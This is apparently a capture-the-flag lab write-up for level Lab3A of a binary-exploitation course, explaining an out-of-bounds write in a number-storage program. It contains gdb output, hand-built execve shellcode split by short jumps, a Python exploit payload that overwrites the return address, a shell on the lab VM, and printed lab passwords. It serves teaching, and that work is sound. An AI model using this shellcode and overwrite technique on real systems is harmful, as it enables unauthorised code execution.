---
title: "Разбор Lab3A (сложно)"
permalink: /writeups/mbe/lab3a/
excerpt: "Разбор Lab3A."
---

---
Again, this last level will be a tricky one. First, log into the Lab03 as **Lab3A** (`lab3A:wh0_n33ds_5h3ll3_wh3n_U_h4z_s4nd`) and go to the challenges folder:

```shell
$ ssh lab3A@<VM_IP>
$ cd /levels/lab03/
```

Let's execute the program:

```shell
lab3A@warzone:/levels/lab03$ ./lab3A 
----------------------------------------------------
  Welcome to quends crappy number storage service!  
----------------------------------------------------
 Commands:                                          
    store - store a number into the data storage    
    read  - read a number from the data storage     
    quit  - exit the program                        
----------------------------------------------------
   quend has reserved some storage for herself :>    
----------------------------------------------------

Input command: store
 Number: 123
 Index: 1
 Completed store command successfully
Input command: read
 Index: 1
 Number at data[1] is 123
 Completed read command successfully
Input command: quit
```

It seems that this code allows us to store and retrieve data. Well, let's check the code to have more details...

## Анализ исходного кода

Here is the source code, read it carefully!

```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include "utils.h"

#define STORAGE_SIZE 100

int store_number(unsigned int * data)
{
    unsigned int input = 0;
    unsigned int index = 0;

    /* get number to store */
    printf(" Number: ");
    input = get_unum();

    /* get index to store at */
    printf(" Index: ");
    index = get_unum();

    /* make sure the slot is not reserved */
    if(index % 3 == 0 || (input >> 24) == 0xb7)
    {
        printf(" *** ERROR! ***\n");
        printf("   This index is reserved for quend!\n");
        printf(" *** ERROR! ***\n");

        return 1;
    }

    /* save the number to data storage */
    data[index] = input;

    return 0;
}

/* returns the contents of a specified storage index */
int read_number(unsigned int * data)
{
    unsigned int index = 0;

    /* get index to read from */
    printf(" Index: ");
    index = get_unum();

    printf(" Number at data[%u] is %u\n", index, data[index]);

    return 0;
}

int main(int argc, char * argv[], char * envp[])
{
    int res = 0;
    char cmd[20] = {0};
    unsigned int data[STORAGE_SIZE] = {0};

    /* doom doesn't like enviroment variables */
    clear_argv(argv);
    clear_envp(envp);

    printf("----------------------------------------------------\n"\
           "  Welcome to quend's crappy number storage service!  \n"\
           "----------------------------------------------------\n"\
           " Commands:                                          \n"\
           "    store - store a number into the data storage    \n"\
           "    read  - read a number from the data storage     \n"\
           "    quit  - exit the program                        \n"\
           "----------------------------------------------------\n"\
           "   quend has reserved some storage for herself :>    \n"\
           "----------------------------------------------------\n"\
           "\n");


    /* command handler loop */
    while(1)
    {
        /* setup for this loop iteration */
        printf("Input command: ");
        res = 1;

        /* read user input, trim newline */
        fgets(cmd, sizeof(cmd), stdin);
        cmd[strlen(cmd)-1] = '\0';

        /* select specified user command */
        if(!strncmp(cmd, "store", 5))
            res = store_number(data);
        else if(!strncmp(cmd, "read", 4))
            res = read_number(data);
        else if(!strncmp(cmd, "quit", 4))
            break;

        /* print the result of our command */
        if(res)
            printf(" Failed to do %s command\n", cmd);
        else
            printf(" Completed %s command successfully\n", cmd);

        memset(cmd, 0, sizeof(cmd));
    }

    return EXIT_SUCCESS;
}
```

That's a big piece of code, but can you see the problem? It's right here...

```c
if(index % 3 == 0 || (input >> 24) == 0xb7)
    {
        printf(" *** ERROR! ***\n");
        printf("   This index is reserved for quend!\n");
        printf(" *** ERROR! ***\n");

        return 1;
    }

    data[index] = input;
```

Except if the *index* is a multiple of **3** or the *input* most significant byte equals **0xb7**, you can store data anywhere you want!

Let me be more precise, here is another part of the code:

```c
#define STORAGE_SIZE 100

unsigned int data[STORAGE_SIZE] = {0};
```

The **data** array has a size of 100 bytes initialized with "0" bytes, but as long as you respect the condition, you can store data outside this array with an *index* greater than 100, like *104*...

```shell
----------------------------------------------------
  Welcome to quend's crappy number storage service!  
----------------------------------------------------
 Commands:                                          
    store - store a number into the data storage    
    read  - read a number from the data storage     
    quit  - exit the program                        
----------------------------------------------------
   quend has reserved some storage for herself :>    
----------------------------------------------------

Input command: store
 Number: 1234
 Index: 104
 Completed store command successfully
```

See? No problems! But what does it mean? Well, if we find the corresponding *index* to the return address of **main()**, we can overwrite it. Then, when we submit the **quit** command, we take the control of the execution flow! 

Let's see if we can reproduce that in memory.

## Динамический анализ

Here we need two pieces of information: 
- The return address of *main()*, so we can know what to look for on the stack.
- The address of `data[STORAGE_SIZE]` in memory.

Let's start with the return address of *main()*. It's quite easy to get, we just need to place a breakpoint on the `ret` instruction at the end of the *main() function and check the content of **ESP**.

```nasm
gdb-peda$ disas main
Dump of assembler code for function main:
   0x08048a12 <+0>: push   ebp
   0x08048a13 <+1>: mov    ebp,esp

...[snip]...

   0x08048c3b <+553>:   ret
End of assembler dump.
gdb-peda$ break *main+553
Breakpoint 1 at 0x8048c3b
gdb-peda$ run
Starting program: /levels/lab03/lab3A
----------------------------------------------------
  Welcome to quend's crappy number storage service!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   quend has reserved some storage for herself :>
----------------------------------------------------

Input command: quit
[----------------------------------registers-----------------------------------]
EAX: 0x0
EBX: 0xb7fcd000 --> 0x1a9da8
ECX: 0x74 ('t')
EDX: 0xbffff698 ("quit")
ESI: 0x0
EDI: 0x0
EBP: 0x0
ESP: 0xbffff6bc --> 0xb7e3ca83 (<__libc_start_main+243>:    mov    DWORD PTR [esp],eax)
EIP: 0x8048c3b (<main+553>: ret)
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8048c38 <main+550>:    pop    ebx
   0x8048c39 <main+551>:    pop    edi
   0x8048c3a <main+552>:    pop    ebp
=> 0x8048c3b <main+553>:    ret
   0x8048c3c:   xchg   ax,ax
   0x8048c3e:   xchg   ax,ax
   0x8048c40 <__libc_csu_init>: push   ebp
   0x8048c41 <__libc_csu_init+1>:   push   edi
[------------------------------------stack-------------------------------------]
0000| 0xbffff6bc --> 0xb7e3ca83 (<__libc_start_main+243>:   mov    DWORD PTR [esp],eax)
0004| 0xbffff6c0 --> 0x1
0008| 0xbffff6c4 --> 0xbffff758 --> 0x0
0012| 0xbffff6c8 --> 0xbffff7bc --> 0x0
0016| 0xbffff6cc --> 0xb7feccea (<call_init+26>:    add    ebx,0x12316)
0020| 0xbffff6d0 --> 0x1
0024| 0xbffff6d4 --> 0xbffff754 --> 0xbffff888 --> 0x0
0028| 0xbffff6d8 --> 0xbffff6f4 --> 0x49323f3
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x08048c3b in main ()
```

The return address is `0xb7e3ca83`. Now, let's look for the index **1** of `data[STORAGE_SIZE]`. 

Here we can simply set a breakpoint where *main()* calls the *store_number()* function and check **ESP**. Why? Because *store_number()* (as well as *read_number()*) takes a pointer to `data[]` as argument.

```nasm
gdb-peda$ break *main+341
Breakpoint 1 at 0x8048b67
gdb-peda$ run
Starting program: /levels/lab03/lab3A
----------------------------------------------------
  Welcome to quend's crappy number storage service!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   quend has reserved some storage for herself :>
----------------------------------------------------

Input command: store
[----------------------------------registers-----------------------------------]
EAX: 0xbffff508 --> 0x0
EBX: 0xbffff508 --> 0x0
ECX: 0x65 ('e')
EDX: 0xbffff698 ("store")
ESI: 0x0
EDI: 0xbffff698 ("store")
EBP: 0xbffff6b8 --> 0x0
ESP: 0xbffff4f0 --> 0xbffff508 --> 0x0
EIP: 0x8048b67 (<main+341>: call   0x8048917 <store_number>)
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8048b5e <main+332>:    jne    0x8048b75 <main+355>
   0x8048b60 <main+334>:    lea    eax,[esp+0x18]
   0x8048b64 <main+338>:    mov    DWORD PTR [esp],eax
=> 0x8048b67 <main+341>:    call   0x8048917 <store_number>
   0x8048b6c <main+346>:    mov    DWORD PTR [esp+0x1bc],eax
   0x8048b73 <main+353>:    jmp    0x8048bd2 <main+448>
   0x8048b75 <main+355>:    mov    DWORD PTR [esp+0x8],0x4
   0x8048b7d <main+363>:    mov    DWORD PTR [esp+0x4],0x8048f63
Guessed arguments:
arg[0]: 0xbffff508 --> 0x0
[------------------------------------stack-------------------------------------]
0000| 0xbffff4f0 --> 0xbffff508 --> 0x0
0004| 0xbffff4f4 --> 0x8048f5d ("store")
0008| 0xbffff4f8 --> 0x5
0012| 0xbffff4fc --> 0x0
0016| 0xbffff500 --> 0xb7fff55c --> 0xb7fde000 --> 0x464c457f
0020| 0xbffff504 --> 0xbffff568 --> 0x0
0024| 0xbffff508 --> 0x0
0028| 0xbffff50c --> 0x0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x08048b67 in main ()
```

Here, the pointer to the `data[]` array is `0xbffff508`. Now, what? Well, now that we have the pointer of our array, we can start dumping the content of the stack to find out where the *main()* return address (`0xb7e3ca83`) is:

```nasm
gdb-peda$ x/128x 0xbffff508
0xbffff508: 0x00000000  0x00000000  0x00000000  0x00000000
0xbffff518: 0x00000000  0x00000000  0x00000000  0x00000000
0xbffff528: 0x00000000  0x00000000  0x00000000  0x00000000
0xbffff538: 0x00000000  0x00000000  0x00000000  0x00000000
0xbffff548: 0x00000000  0x00000000  0x00000000  0x00000000
0xbffff558: 0x00000000  0x00000000  0x00000000  0x00000000
0xbffff568: 0x00000000  0x00000000  0x00000000  0x00000000
0xbffff578: 0x00000000  0x00000000  0x00000000  0x00000000
0xbffff588: 0x00000000  0x00000000  0x00000000  0x00000000
0xbffff598: 0x00000000  0x00000000  0x00000000  0x00000000
0xbffff5a8: 0x00000000  0x00000000  0x00000000  0x00000000
0xbffff5b8: 0x00000000  0x00000000  0x00000000  0x00000000
0xbffff5c8: 0x00000000  0x00000000  0x00000000  0x00000000
0xbffff5d8: 0x00000000  0x00000000  0x00000000  0x00000000
0xbffff5e8: 0x00000000  0x00000000  0x00000000  0x00000000
0xbffff5f8: 0x00000000  0x00000000  0x00000000  0x00000000
0xbffff608: 0x00000000  0x00000000  0x00000000  0x00000000
0xbffff618: 0x00000000  0x00000000  0x00000000  0x00000000
0xbffff628: 0x00000000  0x00000000  0x00000000  0x00000000
0xbffff638: 0x00000000  0x00000000  0x00000000  0x00000000
0xbffff648: 0x00000000  0x00000000  0x00000000  0x00000000
0xbffff658: 0x00000000  0x00000000  0x00000000  0x00000000
0xbffff668: 0x00000000  0x00000000  0x00000000  0x00000000
0xbffff678: 0x00000000  0x00000000  0x00000000  0x00000000
0xbffff688: 0x00000000  0x00000000  0x00000000  0x00000000
0xbffff698: 0x726f7473  0x00000065  0x00000000  0x00000000
0xbffff6a8: 0x00000000  0x00000001  0xb7fcd000  0x00000000
0xbffff6b8: 0x00000000  0xb7e3ca83  0x00000001  0xbffff758
0xbffff6c8: 0xbffff7bc  0xb7feccea  0x00000001  0xbffff754
```


The return address is `0xb7e3ca83` and is placed at `0xbffff6bc` on the stack. Given the array starts at `0xbffff508` (index 0), we just need to do a little subtraction:
- `(0xbffff6bc - 0xbffff508) / 4 = 0x6d` 

We found **0x6d** or **109** in decimal. Note that we divided the result by **4** because the program store integers, not bytes! So, if we are right, we should be able to overwrite the return address by writing something at **index 109**. Let's do a quick check and store *1094795585* (0x41414141) at the index 109.

```nasm
gdb-peda$ run
Starting program: /levels/lab03/lab3A
----------------------------------------------------
  Welcome to quend's crappy number storage service!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   quend has reserved some storage for herself :>
----------------------------------------------------

Input command: store
 Number: 1094795585
 Index: 109
 Completed store command successfully
Input command: quit

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x0
EBX: 0xb7fcd000 --> 0x1a9da8
ECX: 0x74 ('t')
EDX: 0xbffff698 ("quit")
ESI: 0x0
EDI: 0x0
EBP: 0x0
ESP: 0xbffff6c0 --> 0x1
EIP: 0x41414141 ('AAAA')
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41414141
[------------------------------------stack-------------------------------------]
0000| 0xbffff6c0 --> 0x1
0004| 0xbffff6c4 --> 0xbffff758 --> 0x0
0008| 0xbffff6c8 --> 0xbffff7bc --> 0x0
0012| 0xbffff6cc --> 0xb7feccea (<call_init+26>:    add    ebx,0x12316)
0016| 0xbffff6d0 --> 0x1
0020| 0xbffff6d4 --> 0xbffff754 --> 0xbffff888 --> 0x0
0024| 0xbffff6d8 --> 0xbffff6f4 --> 0x65a027a6
0028| 0xbffff6dc --> 0x804a27c --> 0xb7e3c990 (<__libc_start_main>: push   ebp)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41414141 in ?? ()
```

This is awesome! We have the control over EIP :) But that's only the first problem. Now, we need to write a shellcode to return to **but** we **cannot** write at certain *index* (do you remember this check `if(index % 3 == 0 || (input >> 24) == 0xb7)`). How can we do that? Let's think about it.

## Shellcoding

Ok, we got control over the return address so, we could use this to return to the **data** array. But we can't write a "continuous" shellcode as we have to respect the following condition : `if(index % 3 == 0 || (input >> 24) == 0xb7)`. That means if I try to write a "fake" shellcode in memory, it'll look like that :

```nasm
0xbffff548: 0x00000000  0x41414141  0x41414141  0x00000000
0xbffff558: 0x41414141  0x41414141  0x00000000  0x41414141
0xbffff568: 0x41414141  0x00000000  0x41414141  0x41414141
```

Yep, we cannot write at certain *index*... But what if we could jump over those NULL bytes? I won't go too deep into the details, but you can check this technique [here](http://thestarman.narod.ru/asm/2bytejumps.htm).

As you can see, we can write 2 bytes of data before hitting a reserved address space. But we could use what we call **short jump** or **forward short jumps**. **Forward Jumps** use relative offset values from 00h to 7Fh which enable program execution to jump to another instruction with a maximum of 127 bytes between them.

So, we could write a small part of a shellcode then jump over the NULL bytes, execute another part, then jump over the NULL bytes, etc. Here we have to jump over 4 bytes. In assembler it means : `\xeb\x04` (check [here](http://ref.x86asm.net/coder32.html#xEB)).

Okay, we are almost there! As it's kind of annoying to write a long shellcode with this method, we'll stick to something short.

```nasm
global _start
_start:

xor    eax, eax ; EAX = 0
push   eax ; push our null byte on the stack to end the string
; push "/bin//sh" in reverse order
push   0x68732f2f ; "hs//"
push   0x6e69622f ; "nib/"

; execve("/bin//sh/", 0, 0);
mov    ebx, esp ; EBX = ptr to "/bin//sh"
mov    ecx, eax ; ECX = 0
mov    edx, eax ; EDX = 0
mov    al, 0xb ; sys_execve()
int    0x80
```

**Заметка** The *Warzone* VM doesn't have **NASM** installed, so I did the development on another Linux VM.
{: .notice--info}

```shell
$ nano shellcode.asm
$ nasm -f elf32 shellcode.asm
```

Then, we can check the code and generate the shellcode.

```shell
$ objdump -M intel -d shellcode.o

shellcode.o:     file format elf32-i386

Disassembly of section .text:

00000000 <_start>:
   0:   31 c0                   xor    eax,eax
   2:   50                      push   eax
   3:   68 2f 2f 73 68          push   0x68732f2f
   8:   68 2f 62 69 6e          push   0x6e69622f
   d:   89 e3                   mov    ebx,esp
   f:   89 c1                   mov    ecx,eax
  11:   89 c2                   mov    edx,eax
  13:   b0 0b                   mov    al,0xb
  15:   cd 80                   int    0x80
```

Now, we need to split the shellcode into chunks of 6 bytes, pad it with NOPs (`0x90`) and add the short jump of 4 bytes (`\xeb\x04`).

```text
31 c0 50 90 90 90 eb 04          
68 2f 2f 73 68 90 eb 04
68 2f 62 69 6e 90 eb 04
89 e3 89 c1 89 c2 eb 04        
b0 0b cd 80 
```

Finally, we can convert the values to 4-byte unsigned integers (little endian).

```nasm
0x9050c031
0x04eb9090
0x732f2f68
0x04eb9068
0x69622f68
0x04eb906e
0xc189e389
0x04ebc289
0x08cd0bb0
```

Then, we can create our proof of concept. Note that the shellcode will start at the address `0xbffff50c` and not `0xbffff508` as we cannot write at the index **0**.

```python
def store(val, idx):
    data = "store\n"
    data += str(int(val)) + "\n"
    data += str(idx) + "\n"

    return data

payload = store(0x90909090, 1)
payload += store(0x04eb9090, 2)
payload += store(0x90909090, 4)
payload += store(0x04eb9090, 5)
payload += store(0x90909090, 7)
payload += store(0x04eb9090, 8)
payload += store(0x90909090, 10)
payload += store(0x04eb9090, 11)
payload += store(0x90909090, 13)
payload += store(0x04eb9090, 14)
payload += store(0x9050c031, 16)
payload += store(0x04eb9090, 17)
payload += store(0x732f2f68, 19)
payload += store(0x04eb9068, 20)
payload += store(0x69622f68, 22)
payload += store(0x04eb906e, 23)
payload += store(0xc189e389, 25)
payload += store(0x04ebc289, 26)
payload += store(0x80cd0bb0, 28)

# Overwrite the return address
payload += store(0xbffff50c, 109) 
payload += "quit\n"

print(payload)
```

Next, let's execute our proof of concept in `gdb`.

```nasm
gdb-peda$ r < <(python /tmp/lab3c.py)
Starting program: /levels/lab03/lab3A < <(python /tmp/lab3c.py)
----------------------------------------------------
  Welcome to quend's crappy number storage service!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   quend has reserved some storage for herself :>
----------------------------------------------------

Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
process 2373 is executing new program: /bin/dash
[Inferior 1 (process 2373) exited normally]
Warning: not running or target is remote
```

Nice, it seems to be working.

## Решение

As the stack addresses determined using *gdb* vary when directly executing the program, we have to try different addresses to hit the shellcode. The address for the *index 1* of the `data[]` we found in *gdb* was `0xbffff50c`, as the stack address are usually a bit lower outside *gdb*, we can decrease the `0xbffff50c` value one by one until we reach a valid return address.

Here `0xbffff4ea` did the trick.

```bash
lab3A@warzone:/levels/lab03$ (python /tmp/lab3c.py;cat;) | ./lab3A
----------------------------------------------------
  Welcome to quend's crappy number storage service!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   quend has reserved some storage for herself :>
----------------------------------------------------

Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
whoami
lab3end
cat /home/lab3end/.pass
sw00g1ty_sw4p_h0w_ab0ut_d3m_h0ps
```

Good job! You can go to the next [challenge](/writeups/mbe/lab4c/) and learn about **format strings**!
